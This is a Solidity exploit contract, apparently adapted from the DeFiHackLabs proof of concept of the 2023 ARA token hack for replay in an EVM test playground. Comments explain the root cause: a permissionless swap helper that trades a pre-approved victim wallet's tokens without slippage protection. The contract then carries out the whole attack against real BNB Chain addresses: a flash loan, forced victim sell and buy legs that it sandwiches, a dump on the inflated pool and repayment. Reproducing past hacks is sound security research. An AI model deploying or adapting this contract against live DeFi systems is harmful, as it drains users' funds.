// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-06-ARA).
// The DeFiHackLabs PoC (test/ARA_exp.sol) runs the attack INLINE in the Foundry
// test contract — the DODO flash-loan callback `DPPFlashLoanCall` lives on the
// test itself (`attacker = address(this)`), so there is no standalone contract
// to deploy. This file is a faithful, self-contained copy of that inline attack
// (testExploit + DPPFlashLoanCall + callSwapContract + routerV3Swap + the V3
// router interface) so the playground can deploy it and record run().
// Logic and constants are copied verbatim from test/ARA_exp.sol.
//
// Root cause: the ARA "swap helper" exposes a permissionless
// `swapExactInputSingle(amount, minOut=0, token, onBehalfOf)` that pulls tokens
// from a pre-approved victim address and swaps them on PancakeSwap V3 with NO
// slippage protection. Anyone can therefore force the victim's funds to trade at
// an attacker-chosen price. The attacker sandwiches the forced victim legs: use
// the helper to crash the ARA price (victim sells low), buy the dip with
// flash-loaned BUSDT, use the helper to pump the price (victim buys high), then
// dump on the inflated pool and repay the flash loan.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IDPPOracle {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IPancakeRouterV3 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams memory params) external payable returns (uint256 amountOut);
}

contract ARADrain {
    IERC20 constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant ARA = IERC20(0x5542958FA9bD89C96cB86D1A6Cb7a3e644a3d46e);
    IPancakeRouterV3 constant Router = IPancakeRouterV3(0x13f4EA83D0bd40E75C8222255bc855a974568Dd4);
    IDPPOracle constant DPPOracle = IDPPOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
    address constant EXPLOITABLE = 0x7BA5dd9Bb357aFa2231446198c75baC17CEfCda9;
    // The pre-approved victim hot wallet whose funds the helper can move.
    address constant APPROVED = 0xB817Ef68d764F150b8d73A2ad7ce9269674538E0;

    function run() external {
        BUSDT.approve(address(Router), type(uint256).max);
        ARA.approve(address(Router), type(uint256).max);
        // Flash-loan 1,202,701 BUSDT; the callback below performs the attack + repays.
        DPPOracle.flashLoan(0, 1_202_701 * 1e18, address(this), new bytes(1));
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        // Step 1. Force the victim to SELL 163,497 ARA -> BUSDT (crashes the price).
        callSwapContract(163_497 * 1e18, ARA);

        // Step 2. Buy the dip with the flash-loaned BUSDT (pumps the price).
        routerV3Swap(BUSDT, ARA, 1_202_701 * 1e18);

        // Step 3. Force the victim to BUY with 132,123 BUSDT (pushes price to the top).
        callSwapContract(132_123 * 1e18, BUSDT);

        // Step 4. Dump the attacker's ARA back for BUSDT on the inflated pool.
        routerV3Swap(ARA, BUSDT, ARA.balanceOf(address(this)));

        // Step 5. Repay the flash loan (the spread is the profit).
        BUSDT.transfer(address(DPPOracle), quoteAmount);
    }

    function callSwapContract(uint256 amount, IERC20 token) internal {
        // Selector 0x135b43e9 — the helper's permissionless swap-on-behalf entry.
        (bool success,) = EXPLOITABLE.call(abi.encodeWithSelector(bytes4(0x135b43e9), amount, 0, address(token), APPROVED));
        require(success, "Swap not successful");
    }

    function routerV3Swap(IERC20 token1, IERC20 token2, uint256 amount) internal {
        IPancakeRouterV3.ExactInputSingleParams memory params = IPancakeRouterV3.ExactInputSingleParams({
            tokenIn: address(token1),
            tokenOut: address(token2),
            fee: 100,
            recipient: address(this),
            amountIn: amount,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        Router.exactInputSingle(params);
    }
}
